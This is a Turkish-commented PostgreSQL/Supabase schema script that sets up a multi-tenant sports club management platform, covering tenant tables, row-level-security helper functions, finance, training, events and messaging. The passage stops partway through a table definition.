-- ===========================================================================
-- 01_sema.sql — Spor Kulübü Yönetim Platformu · TAM ŞEMA (sıfırdan kurulum)
-- ===========================================================================
-- Bu dosya app/supabase/migrations/0001–0035 arasındaki TÜM migration'ların
-- NİHAİ halini tek dosyada birleştirir. Ara adımlar (drop+recreate edilen
-- politikalar, sonradan eklenen kolonlar, alter policy ile genişletilen
-- muhasebe kuralları, search_path sertleştirmeleri) burada zincir olarak
-- DEĞİL, doğrudan son hâlleriyle yazılmıştır.
--
-- ÇOK KİRACILILIK (0021 + 0022) BU DOSYAYA DAHİLDİR:
--   · kulup tablosu + private.current_kulup_id()
--   · 41 kiracı tablosunda  kulup_id NOT NULL default private.current_kulup_id()
--   · 3 katalog tablosunda  (brans / hizmet_turu / beceri) NULLABLE kulup_id
--   · profiles.kulup_id     (nullable, default YOK — gerekçe bölüm 2)
--   · 14 bileşik benzersizlik + 23 bileşik FK (bağ tablolarının kiracı bütünlüğü)
--   · 55 RESTRICTIVE izolasyon politikası
--   · davet tablosu + davet token'ını çözen handle_new_user
--
--   0021'in VERİ TAŞIMA adımları (bölüm 5 ve 6.2 — mevcut satırların varsayılan
--   kulübe bağlanması) BİLİNÇLİ OLARAK DAHİL DEĞİLDİR: bu dosya sıfırdan kurulum
--   içindir, taşınacak veri yoktur. Kulüp kaydı 03_kulup_olustur.sql'de açılır.
--
-- 0023–0025 DE DAHİLDİR:
--   · 0023 abonelik kill-switch'i  → private.current_kulup_id() gövdesindeki
--                                    `k.durum = 'aktif'` koşulu (bölüm 2)
--   · 0024 yumuşak silme           → grup + sporcular tablolarında aktif /
--                                    pasif_tarihi kolonları ve bileşik indeksler
--   · 0025 maç sonucu girişi       → "etkinlik: antrenör kendi grubunun maç
--                                    sonucunu girer" politikası (12.7),
--                                    protect_etkinlik_sonuc() trigger'ı (13.8),
--                                    etkinlik_sonuc_bekleyen_idx (bölüm 14)
--   0023'ün "mevcut kulüpleri aktifleştir" UPDATE'i dahil DEĞİL (veri taşıması;
--   kulüp zaten 03_kulup_olustur.sql'de 'aktif' doğar).
--
-- İÇERMEZ: hiçbir INSERT / demo verisi / kulübe özgü kayıt.
--   · Platform kataloğu (tüm kulüplerde ortak) → kurulum/02_katalog.sql
--   · Kulübün kendi başlangıç kayıtları        → kurulum/03_kulup_olustur.sql
--   · Yalnızca demo/satış ortamı verisi        → demo/karsiyaka_demo.sql
--
-- ÇALIŞTIRMA SIRASI (yeni bir Supabase projesinde — SQL Editor veya psql):
--   1) kurulum/01_sema.sql            <-- bu dosya
--   2) kurulum/02_katalog.sql         platform kataloğu (brans/hizmet_turu/beceri)
--   3) kurulum/03_kulup_olustur.sql   kulüp + şube + kurum ayarları + bayraklar
--   4) İLK YÖNETİCİNİN HESABINI AÇIN (uygulamadan "Kayıt Ol" ya da
--      Supabase > Authentication > Users > "Add user")
--      ⚠ Bu adım 3'ten SONRA olmak ZORUNDA: handle_new_user() sistemde hiç kulüp
--        yoksa açık bir exception atar (bölüm 13.2).
--   5) kurulum/04_ilk_yonetici.sql    hesabı 'yonetici' yapar (ZORUNLU)
--   6) (yalnızca demo/satış ortamında) demo/karsiyaka_demo.sql
--
-- ✔ BU ADIMLAR YETERLİDİR — app/supabase/migrations/ altındaki dosyaların
--   HİÇBİRİNİ ayrıca çalıştırmayın. Paket 0001–0025'in nihai halini içerir;
--   migration klasörü yalnızca ZATEN KURULU bir projeyi güncellemek içindir.
--
-- Bu dosya baştan sona TEK SEFERDE çalıştırılır. Postgres 15+ / Supabase
-- uyumludur. auth şeması, auth.users tablosu, `anon` / `authenticated` /
-- `service_role` rolleri ve `supabase_realtime` publication'ı Supabase
-- tarafından hazır gelir.
--
-- BÖLÜMLER
--   1)  Enum, private şeması, rol fonksiyonu
--   2)  Kiracı çekirdeği: kulup + profiles + private.current_kulup_id()
--   3)  Kurum tabloları (şube, branş, grup, sporcular, bağlar)
--   4)  Finans (aidat + ödeme)
--   5)  Antrenman / yoklama / gelişim
--   6)  Duyuru / etkinlik / maç kadrosu
--   7)  Mesajlaşma
--   8)  Servis / mağaza
--   9)  Bireysel ders / hakediş / başvuru
--   10) Muhasebe / ayarlar / mobil bayrak / push
--   11) Davet (çok kiracılı kayıt akışı)
--   12) Row Level Security: etkinleştirme + rol politikaları + kiracı duvarı
--   13) Fonksiyonlar, trigger'lar, grant/revoke
--   14) kulup_id indeksleri + bileşik/kısmi indeksler
--   15) Realtime yayını
-- ===========================================================================
--
-- KİRACI KOLONU DESENİ (0021 karar 3) — dosya boyunca tekrarlanan üç satır:
--
--   kulup_id uuid not null default private.current_kulup_id() references kulup(id)
--
--   · default sayesinde uygulama kodundaki ~33 INSERT çağrısının HİÇBİRİ kolonu
--     yazmaz; PostgREST kolonu atlar, Postgres çağıranın kulübüyle doldurur.
--   · kulup_id kolonu tabloların EN SONUNA yazılıyor. Görsel olarak başa yakışırdı
--     ama 0021 kolonu `alter table ... add column` ile eklediği için migration
--     yoluyla güncellenen bir veritabanında kolon HER ZAMAN sonda durur; aynı
--     yerde tutmak iki kurulumun pg_dump çıktısını birebir aynı tutar.
--   · service_role bağlamında auth.uid() NULL'dur → default NULL üretir → NOT NULL
--     ihlali (23502). createAdminClient() kullanan her route ve SQL Editor'dan
--     yapılan her INSERT kulup_id'yi AÇIKÇA yazmak zorundadır (0021 UYARI 2).
-- ===========================================================================

-- private.current_profile_role() bölüm 1'de, public.profiles ise bölüm 2'de
-- yaratılıyor. LANGUAGE SQL fonksiyon gövdeleri CREATE anında doğrulandığı için
-- (check_function_bodies varsayılan olarak açık) bu sıra hata verirdi. pg_dump'ın
-- da kullandığı standart çözüm: gövde doğrulamasını dosya boyunca kapatmak.
-- Dosyanın sonunda tekrar açılıyor. Çalışma zamanında hiçbir etkisi yoktur.
set check_function_bodies = off;


-- ===========================================================================
-- 1) ENUM, PRIVATE ŞEMASI, ROL FONKSİYONU
--    Kaynak: 0001 (enum), 0015 (enum'a 'muhasebeci'), 0021 (enum'a
--            'platform_admin'), 0004 (current_profile_role), 0006 (private şema)
-- ===========================================================================

-- 0001 üç değerle yaratmış, 0015 'muhasebeci'yi, 0021 'platform_admin'i
-- eklemişti — burada BEŞ değerli nihai hâli tek seferde tanımlanıyor
-- (alter type zinciri yok).
--
-- platform_admin (0021): platform sahibinin rolü. Bilinçli olarak HİÇBİR RLS
-- politikasında kullanılmıyor — süper-admin service_role ile bağlanır ve RLS'i
-- baypas eder. Enum değeri yalnızca "bu profil normal bir kulüp kullanıcısı
-- değil" işaretidir; kulup_id'si NULL kalır ve bu sayede bölüm 12'deki
-- restrictive politikaların hepsi onun için fail-closed olur.
create type app_role as enum ('yonetici', 'veli', 'antrenor', 'muhasebeci', 'platform_admin');

-- 0006: fonksiyonlar bilinçli olarak `private` şemasında. PostgREST yalnızca
-- `public` şemasını dışa açtığı için buradaki fonksiyonlar /rest/v1/rpc/ üzerinden
-- çağrılamaz; RLS politikaları ise fonksiyona OID ile bağlandığından etkilenmez.
create schema if not exists private;

-- RLS politikalarında tekrar tekrar profiles sorgusu yazmamak için. SECURITY
-- DEFINER olduğundan profiles'ın kendi RLS'ine takılmadan çağıranın rolünü döner.
create or replace function private.current_profile_role()
returns text
language sql
stable
security definer
set search_path = public
as $$
  select role::text from public.profiles where id = auth.uid()
$$;


-- ===========================================================================
-- 2) KİRACI ÇEKİRDEĞİ — kulup + profiles + private.current_kulup_id()
--    Kaynak: 0021 (bölüm 1-4), 0001 (profiles)
-- ===========================================================================
-- SIRA KRİTİK, üç bağımlılık iç içe:
--   kulup   → profiles.kulup_id FK'sinin hedefi, bu yüzden EN ÖNCE.
--   profiles→ private.current_kulup_id() gövdesi profiles.kulup_id kolonunu okur.
--   fonksiyon→ bölüm 3'ten itibaren HER tablonun kulup_id default ifadesi bu
--             fonksiyona OID ile bağlanır; fonksiyon yoksa "function
--             private.current_kulup_id() does not exist" ile patlar.
--             (check_function_bodies=off bunu KURTARMAZ: o ayar yalnızca
--             fonksiyon gövdelerini etkiler, kolon default ifadelerini değil.)
--
-- profiles'ın sube_id FK'si bu yüzden tablo gövdesinde DEĞİL, bölüm 3'te sube
-- yaratıldıktan sonra `alter table` ile bağlanıyor (0004'teki orijinal desen).

-- Kiracı kök tablosu. Faturalama/abonelik alanları (plan, sporcu_limiti,
-- abonelik_bitis) süper-admin panelinin yöneteceği alanlardır; uygulama bu
-- alanları okumaz.
create table kulup (
  id             uuid primary key default gen_random_uuid(),
  ad             text not null,
  slug           text unique,
  durum          text not null default 'deneme' check (durum in ('aktif', 'askida', 'deneme')),
  plan           text,
  sporcu_limiti  int,
  abonelik_bitis date,
  -- 0034: true = yönetici davetini YALNIZCA platform_admin çıkarabilir.
  -- Kulüp kendi antrenör/muhasebeci/veli davetlerini çıkarmaya devam eder.
  -- Büyük bir müşteride "kendi yöneticilerinizi siz yönetin" denecekse false yapılır.
  yonetici_davet_kilitli boolean not null default true,
  created_at     timestamptz not null default now()
);

-- Kullanıcı profilleri — auth.users'a 1:1 bağlı, rol bazlı yetkilendirmenin temeli.
--
-- kulup_id NULLABLE ve default'suz — iki gerekçe (0021 bölüm 3):
--   a) platform_admin'in kulübü yoktur (kulup_id NULL kalır).
--   b) profiles, `default private.current_kulup_id()` hilesini YAPISAL olarak
--      kullanamaz: fonksiyon kulüp bilgisini profiles'tan okur, bir satır kendi
--      default'unu kendinden türetemez. Bu yüzden profiles.kulup_id her zaman
--      AÇIKÇA yazılmak zorundadır (bkz. bölüm 13.2 — handle_new_user).
--
-- profiles_id_kulup_uniq (0021 bölüm 7.1): mantıksal olarak gereksiz (id zaten
-- PK) ama veli_sporcu / sporcu_antrenor tablolarındaki bileşik FK'lerin
-- hedefleyebilmesi için ŞART — FK yalnızca unique/PK'ye bağlanabilir.
create table profiles (
  id uuid primary key references auth.users (id) on delete cascade,
  role app_role not null,
  ad text not null,
  telefon text,
  sube_id uuid,
  avatar_url text,
  created_at timestamptz not null default now(),
  kulup_id uuid references kulup(id),
  -- 0029: erişimi kaldırılmış kullanıcı. false ise current_kulup_id() NULL
  -- döner ve 55 restrictive politikanın hepsi o kişi için kapanır.
  aktif boolean not null default true,
  pasif_tarihi timestamptz,
  constraint profiles_id_kulup_uniq unique (id, kulup_id),
  -- 0026: platform_admin KULÜPSÜZDÜR. Bölüm 12.13'teki restrictive kiracı duvarı
  -- `kulup_id = current_kulup_id()` der; platform_admin'in kulup_id'si NULL
  -- olduğu için karşılaştırma NULL üretir ve satır reddedilir — süper-admin
  -- normal API üzerinden hiçbir kulüp verisini göremez, yalnızca service_role
  -- paneliyle çalışır. Bu alan yanlışlıkla dolarsa duvar O KULÜP İÇİN AÇILIR ve
  -- süper-admin o kulübün verisini anon key ile okumaya başlar. Kısıt, tüm
  -- tasarımın dayandığı varsayımı zorunlu kılıyor.
  -- Tersi (kulüp rolü ⇒ kulup_id NOT NULL) bilerek zorlanmıyor: kulüpsüz bir
  -- kulüp rolü sızdırmaz, yalnızca fail-closed olur — bkz. 0026 bölüm 2.
  constraint profiles_platform_admin_kulupsuz
    check (role <> 'platform_admin' or kulup_id is null)
);

-- ---------------------------------------------------------------------------
-- private.current_kulup_id() — bölüm 12'deki 55 restrictive politikanın ve
-- tüm kulup_id default'larının dayandığı tek fonksiyon.
--   · SECURITY DEFINER  → profiles'ın kendi RLS'ine takılmaz (bkz. UYARI aşağıda)
--   · stable            → aynı sorgu içinde tek kez değerlendirilebilir
--   · set search_path   → search_path enjeksiyonuna kapalı (0017 deseni)
--   · private şemasında → PostgREST yalnızca public'i yayımladığı için
--                         /rest/v1/rpc/ üzerinden çağrılamaz (0006 deseni)
--
-- ABONELİK KILL-SWITCH: gövdedeki `k.durum = 'aktif'` koşulu sayesinde kulübün
-- durumu 'aktif' dışına çekildiği an fonksiyon o kulübün TÜM kullanıcıları için
-- NULL döner; restrictive politikalar NULL karşılaştırmasında fail-closed
-- olduğundan erişim tek bir UPDATE ile kapanır:
--     update kulup set durum = 'askida' where id = '...';
-- Geri açmak da tek UPDATE'tir; hiçbir veri silinmez.
--
-- ⚠ BUNUN KAÇINILMAZ SONUCU: 'deneme' ve 'askida' durumlarının İKİSİ DE KAPALI
--   durumdur. kulup.durum varsayılanı 'deneme' olduğu için `insert into kulup
--   (ad) values (...)` ile açılan bir kulübün kullanıcıları HİÇBİR ŞEY göremez.
--   Deneme süreci `durum='aktif' + plan='deneme' + abonelik_bitis=<tarih>` ile
--   ifade edilmelidir. 03_kulup_olustur.sql kulübü bu yüzden AÇIKÇA 'aktif'
--   yazarak oluşturur, 04_ilk_yonetici.sql de doğrulama bloğunda kontrol eder.
--
-- ⚠ `alter table public.profiles force row level security` ASLA çalıştırılmamalı
--   (0021 UYARI 1): current_profile_role() ve current_kulup_id() SECURITY
--   DEFINER'dır ve sahibi profiles'ın da sahibi olan postgres'tir; tablo sahibi
--   RLS'i baypas ettiği için bu iki fonksiyon profiles'ın KENDİ politikaları
--   içinden çağrılabiliyor. FORCE açılırsa sahiplik istisnası kalkar, ikisi de
--   sonsuz özyinelemeye girer ("infinite recursion detected in policy for
--   relation profiles") ve tüm sistem kilitlenir.
--   AYNI KURAL `kulup` TABLOSU İÇİN DE GEÇERLİ: gövde artık kulup'u da okuyor ve
--   kulup'un kendi politikası (12.1) bu fonksiyonu çağırıyor —
--   `alter table public.kulup force row level security` de ASLA çalıştırılmamalı.
create or replace function private.current_kulup_id()
returns uuid
language sql
stable
security definer
set search_path = public
as $$
  select p.kulup_id
    from public.profiles p
    join public.kulup k on k.id = p.kulup_id
   where p.id = auth.uid()
     and p.aktif                -- 0029: erişimi kaldırılmış kullanıcı
     and k.durum = 'aktif'      -- 0023: aboneliği durmuş kulüp
$$;


-- ===========================================================================
-- 3) KURUM TABLOLARI
--    Kaynak: 0004 (şube, branş, hizmet türü, grup, sporcular, veli↔sporcu,
--            antrenör↔sporcu), 0021 (kulup_id + bileşik kısıtlar),
--            0024 (grup/sporcular yumuşak silme kolonları)
-- ===========================================================================

create table sube (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  alt_bilgi text,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint sube_id_kulup_uniq unique (id, kulup_id)
);

-- 0004'te de böyleydi: profiles → sube FK'si tablo yaratıldıktan SONRA bağlanır.
-- Burada zorunluluk daha da katı (bölüm 2'deki sıra notu).
alter table profiles
  add constraint profiles_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id)
  on delete set null (sube_id);
-- profiles.kulup_id NULLABLE (platform_admin kulüpsüzdür): bileşik FK MATCH
-- SIMPLE davranışıyla kulup_id NULL olduğunda hiç kontrol edilmez — istenen bu.

-- --- ORTAK KATALOG (3 tablo): brans / hizmet_turu / beceri
--     kulup_id NULLABLE. NULL = platform kataloğu (her kulüp okur, kimse
--     değiştiremez), dolu = kulübe özel satır.
--     Default ifadesi aynı iki işi birden yapıyor:
--       · 02_katalog.sql SQL Editor'da postgres olarak koşar → auth.uid() NULL
--         → kulup_id NULL → platform kataloğu.
--       · Panelden yönetici ekler → kendi kulup_id'si → kulübe özel satır.
--     Nullable olması ZORUNLU: 02_katalog.sql yalnızca Basketbol için beceri
--     tanımlıyor; diğer branşların becerilerini kulübün kendisi eklemek zorunda.
create table brans (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  ikon text,
  kulup_id uuid default private.current_kulup_id() references kulup(id)
);

create table hizmet_turu (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  aciklama text,
  ikon text,
  kulup_id uuid default private.current_kulup_id() references kulup(id)
);

-- Bağ tablolarında kulup_id DENORMALİZE (0021 karar: her satırda exists()
-- alt sorgusu yerine kolon). Denormalizasyonun parent'tan sapması bileşik FK ile
-- veritabanı seviyesinde imkânsız kılınıyor.
-- NOT: brans_id / hizmet_turu_id ayağına bileşik FK KONULAMAZ — katalog
-- tablolarında kulup_id nullable'dır (0021 artık risk R1).
create table kurum_brans_secimi (
  sube_id uuid not null references sube(id) on delete cascade,
  brans_id uuid not null references brans(id) on delete cascade,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (sube_id, brans_id),
  constraint kurum_brans_secimi_sube_kulup_fkey
    foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete cascade
);

create table kurum_hizmet_turu_secimi (
  sube_id uuid not null references sube(id) on delete cascade,
  hizmet_turu_id uuid not null references hizmet_turu(id) on delete cascade,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (sube_id, hizmet_turu_id),
  constraint kurum_hizmet_turu_secimi_sube_kulup_fkey
    foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete cascade
);

-- YUMUŞAK SİLME (0024): grup ve sporcular kayıtları SİLİNMEZ, `aktif = false`
-- ile pasife alınır. Gerekçe: sporcular(id)'ye bağlı FK'lerin çoğu ON DELETE
-- CASCADE (ödeme, yoklama, gelişim, kadro...) — tek bir DELETE kapanmış bir
-- muhasebe dönemini geriye dönük siler. Cascade'siz olanlar (fatura.sporcu_id,
-- siparis.sporcu_id, antrenman.grup_id) ise DELETE'i zaten 23503 ile reddeder.
-- İki kolon da kulup_id'den SONRA yazılıyor: 0024 bunları `alter table` ile
-- ekliyor, yani migration yoluyla güncellenen bir veritabanında sıra budur
-- (bkz. başlıktaki KİRACI KOLONU DESENİ notu — iki kurulum yolunun pg_dump
-- çıktısı birebir aynı kalmalı).
--
-- Grup pasife alındığında sporcuların grup_id ataması BİLİNÇLİ OLARAK
-- DEĞİŞTİRİLMEZ: grup geri alındığında kadro olduğu gibi geri gelsin diye.
create table grup (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  brans_id uuid references brans(id),
  sube_id uuid,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  aktif boolean not null default true,
  pasif_tarihi timestamptz,
  constraint grup_id_kulup_uniq unique (id, kulup_id)
);

comment on column grup.aktif is
  'false = kapatılmış / pasife alınmış grup. Kayıt SİLİNMEZ; antrenman ve yoklama geçmişi korunur. Gruptaki sporcuların grup_id ataması değişmez.';
comment on column grup.pasif_tarihi is
  'aktif=false yapıldığı an. Geri alındığında NULL''a döner. Uygulama katmanında yazılır (gruplar/actions.ts).';

-- Sporcular — birleşik roster. veli_ad/veli_telefon/veli_yakinlik ve odeme_durumu
-- bilinçli olarak düz kolon: her veli için gerçek bir profiles satırı olmak zorunda
-- değil. RLS'i sağlayan gerçek ilişki `veli_sporcu` tablosudur.
create table sporcular (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  numara int,
  brans_id uuid references brans(id),
  grup_id uuid references grup(id),
  sube_id uuid,
  odeme_durumu text not null default 'guncel' check (odeme_durumu in ('guncel', 'gecikmis')),
  veli_ad text,
  veli_telefon text,
  veli_yakinlik text,
  dogum_yili int,
  kayit_tarihi text,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  aktif boolean not null default true,
  pasif_tarihi timestamptz,
  constraint sporcular_id_kulup_uniq unique (id, kulup_id)
);

comment on column sporcular.aktif is
  'false = kulüpten ayrılmış / pasife alınmış sporcu. Kayıt SİLİNMEZ; ödeme ve yoklama geçmişi olduğu gibi korunur (0024).';
comment on column sporcular.pasif_tarihi is
  'aktif=false yapıldığı an. Geri alındığında NULL''a döner. Uygulama katmanında yazılır (sporcular/actions.ts).';

create table veli_sporcu (
  veli_id uuid not null references profiles(id) on delete cascade,
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  yakinlik text,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (veli_id, sporcu_id),
  constraint veli_sporcu_veli_kulup_fkey
    foreign key (veli_id, kulup_id) references profiles(id, kulup_id) on delete cascade,
  constraint veli_sporcu_sporcu_kulup_fkey
    foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade
);

create table sporcu_antrenor (
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  antrenor_id uuid not null references profiles(id) on delete cascade,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (sporcu_id, antrenor_id),
  constraint sporcu_antrenor_sporcu_kulup_fkey
    foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade,
  constraint sporcu_antrenor_antrenor_kulup_fkey
    foreign key (antrenor_id, kulup_id) references profiles(id, kulup_id) on delete cascade
);


-- ===========================================================================
-- 4) FİNANS (AİDAT PLANI + ÖDEME)
--    Kaynak: 0007 (tablolar), 0014 (odeme.aidat_plani_id kolonu), 0021 (kulup_id)
-- ===========================================================================

create table aidat_plani (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  alt text,
  fiyat numeric not null,
  beklenen numeric,
  sube_id uuid,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id)
);

-- 0014'te `alter table odeme add column aidat_plani_id ...` ile eklenen kolon
-- burada doğrudan tanımın içinde (nullable — plan bağlamak zorunlu değil).
create table odeme (
  id uuid primary key default gen_random_uuid(),
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  aciklama text not null,
  tutar numeric not null,
  yontem text not null check (yontem in ('kart', 'havale', 'elden')),
  durum text not null default 'bekliyor' check (durum in ('bekliyor', 'gecikti', 'odendi')),
  son_odeme_tarihi date,
  odendi_tarihi date,
  olusturan_id uuid references profiles(id),
  aidat_plani_id uuid references aidat_plani(id),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id)
);


-- ===========================================================================
-- 5) ANTRENMAN / YOKLAMA / GELİŞİM
--    Kaynak: 0008, 0021 (kulup_id)
-- ===========================================================================
-- Not: tablo adı "ders" değil "antrenman" — bireysel ders (ücretli 1:1)
-- kavramıyla isim çakışmasın diye.

-- unique (grup_id, tarih) kiracı bazına çevrilmedi (0021 bölüm 10 kararı):
-- grup zaten kulübe özel bir kayıt, dolayısıyla kısıt ZATEN kulüp içinde geçerli.
create table antrenman (
  id uuid primary key default gen_random_uuid(),
  grup_id uuid not null references grup(id),
  tarih date not null default current_date,
  saat1 text,
  saat2 text,
  tesis text,
  yoklama_kaydedildi boolean not null default false,
  yoklama_kayit_zamani text,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (grup_id, tarih)
);

create table yoklama (
  id uuid primary key default gen_random_uuid(),
  antrenman_id uuid not null references antrenman(id) on delete cascade,
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  durum text check (durum in ('katildi', 'katilmadi')),
  izinli boolean not null default false,
  izin_detay text,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (antrenman_id, sporcu_id)
);

-- Katalog tablosu (kulup_id nullable) — bkz. bölüm 3'teki ortak katalog notu.
create table beceri (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  brans_id uuid references brans(id),
  sira int not null default 0,
  kulup_id uuid default private.current_kulup_id() references kulup(id)
);

-- Sporcu başına DÖNEM (ay) başına bir değerlendirme (0033). Eskiden
-- unique(sporcu_id) vardı ve her güncelleme önceki dönemi KALICI olarak
-- siliyordu; velinin görmek istediği şey ise tam olarak ilerlemedir.
create table gelisim_degerlendirme (
  id uuid primary key default gen_random_uuid(),
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  donem_ay date not null default date_trunc('month', current_date)::date,
  antrenor_id uuid references profiles(id),
  not_metni text not null default '',
  gonderildi boolean not null default false,
  tarih date,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint gelisim_degerlendirme_id_kulup_uniq unique (id, kulup_id),
  constraint gelisim_degerlendirme_sporcu_donem_uniq unique (sporcu_id, donem_ay)
);

create index gelisim_degerlendirme_sporcu_donem_idx
  on gelisim_degerlendirme (sporcu_id, donem_ay desc);

create table gelisim_beceri_seviye (
  degerlendirme_id uuid not null references gelisim_degerlendirme(id) on delete cascade,
  beceri_id uuid not null references beceri(id),
  seviye int not null check (seviye between 1 and 5),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (degerlendirme_id, beceri_id),
  constraint gelisim_beceri_seviye_degerlendirme_kulup_fkey
    foreign key (degerlendirme_id, kulup_id)
    references gelisim_degerlendirme(id, kulup_id) on delete cascade
);


-- ===========================================================================
-- 6) DUYURU / ETKİNLİK / MAÇ KADROSU
--    Kaynak: 0009, 0021 (kulup_id), 0025 (maç sonucu yazma yetkisi — politika
--            12.7'de, trigger 13.8'de, indeks 14.2'de)
-- ===========================================================================

create table duyuru (
  id uuid primary key default gen_random_uuid(),
  baslik text not null,
  mesaj text not null,
  tur text not null default 'genel' check (tur in ('kamp', 'servis', 'basari', 'genel')),
  tum_veliler boolean not null default true,
  sms_ile boolean not null default false,
  olusturan_id uuid references profiles(id),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint duyuru_id_kulup_uniq unique (id, kulup_id)
);

create table duyuru_hedef (
  duyuru_id uuid not null references duyuru(id) on delete cascade,
  grup_id uuid not null references grup(id),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (duyuru_id, grup_id),
  constraint duyuru_hedef_duyuru_kulup_fkey
    foreign key (duyuru_id, kulup_id) references duyuru(id, kulup_id) on delete cascade,
  constraint duyuru_hedef_grup_kulup_fkey
    foreign key (grup_id, kulup_id) references grup(id, kulup_id)
);

create table etkinlik (
  id uuid primary key default gen_random_uuid(),
  tur text not null check (tur in ('mac', 'turnuva', 'kamp')),
  baslik text not null,
  grup_id uuid references grup(id),
  tesis text,
  tarih date not null,
  saat text,
  lcv_istenir boolean not null default false,
  ucretli boolean not null default false,
  tutar numeric,
  aciklama text,
  rakip text,
  skor_biz int,
  skor_rakip int,
  sonuc text check (sonuc in ('galibiyet', 'maglubiyet', 'beraberlik')),
  sonuc_notu text,
  olusturan_id uuid references profiles(id),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint etkinlik_id_kulup_uniq unique (id, kulup_id)
);

create table etkinlik_katilim (
  etkinlik_id uuid not null references etkinlik(id) on delete cascade,
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  durum text not null default 'bekliyor' check (durum in ('bekliyor', 'katilir', 'katilmaz')),
  updated_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (etkinlik_id, sporcu_id),
  constraint etkinlik_katilim_etkinlik_kulup_fkey
    foreign key (etkinlik_id, kulup_id) references etkinlik(id, kulup_id) on delete cascade,
  constraint etkinlik_katilim_sporcu_kulup_fkey
    foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade
);

create table mac_kadro (
  id uuid primary key default gen_random_uuid(),
  etkinlik_id uuid not null unique references etkinlik(id) on delete cascade,
  yayinlandi boolean not null default false,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint mac_kadro_id_kulup_uniq unique (id, kulup_id),
  constraint mac_kadro_etkinlik_kulup_fkey
    foreign key (etkinlik_id, kulup_id) references etkinlik(id, kulup_id) on delete cascade
);

create table mac_kadro_sporcu (
  mac_kadro_id uuid not null references mac_kadro(id) on delete cascade,
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  secili boolean not null default false,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (mac_kadro_id, sporcu_id),
  constraint mac_kadro_sporcu_kadro_kulup_fkey
    foreign key (mac_kadro_id, kulup_id) references mac_kadro(id, kulup_id) on delete cascade,
  constraint mac_kadro_sporcu_sporcu_kulup_fkey
    foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade
);


-- ===========================================================================
-- 7) MESAJLAŞMA
--    Kaynak: 0010 (tablolar), 0011 (mesaj.gonderen_rol kolonu), 0021 (kulup_id)
-- ===========================================================================

create table konusma (
  id uuid primary key default gen_random_uuid(),
  -- 0029: kişi silinince konuşma da gider (içeriği onun kişisel verisi).
  veli_id uuid not null references profiles(id) on delete cascade,
  antrenor_id uuid not null references profiles(id) on delete cascade,
  son_mesaj text,
  son_mesaj_zaman timestamptz,
  veli_okundu_zaman timestamptz,
  antrenor_okundu_zaman timestamptz,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (veli_id, antrenor_id),
  constraint konusma_id_kulup_uniq unique (id, kulup_id)
);

-- gonderen_rol (0011): aynı hesabın hem veli hem antrenör olarak test edildiği
-- durumda (veli_id = antrenor_id) mesajın hangi "şapkayla" yazıldığını ayırt eder.
create table mesaj (
  id uuid primary key default gen_random_uuid(),
  konusma_id uuid not null references konusma(id) on delete cascade,
  gonderen_id uuid not null references profiles(id) on delete cascade,   -- 0029
  metin text not null,
  gonderen_rol text not null default 'veli' check (gonderen_rol in ('veli', 'antrenor')),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint mesaj_konusma_kulup_fkey
    foreign key (konusma_id, kulup_id) references konusma(id, kulup_id) on delete cascade
);


-- ===========================================================================
-- 8) SERVİS / MAĞAZA
--    Kaynak: 0012 (tablolar), 0018 (servis_rota.sofor_telefon), 0021 (kulup_id)
-- ===========================================================================

-- sofor_telefon (0018): servis ekranındaki "Ara" butonu için. Boşsa uygulama
-- butonu gizler.
create table servis_rota (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  sofor text not null,
  plaka text not null,
  arac text not null,
  alt text,
  durum_txt text not null default 'Planlandı',
  yolda boolean not null default false,
  konum_saat text,
  konum_hiz text,
  sofor_telefon text,
  sube_id uuid,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint servis_rota_id_kulup_uniq unique (id, kulup_id)
);

create table servis_durak (
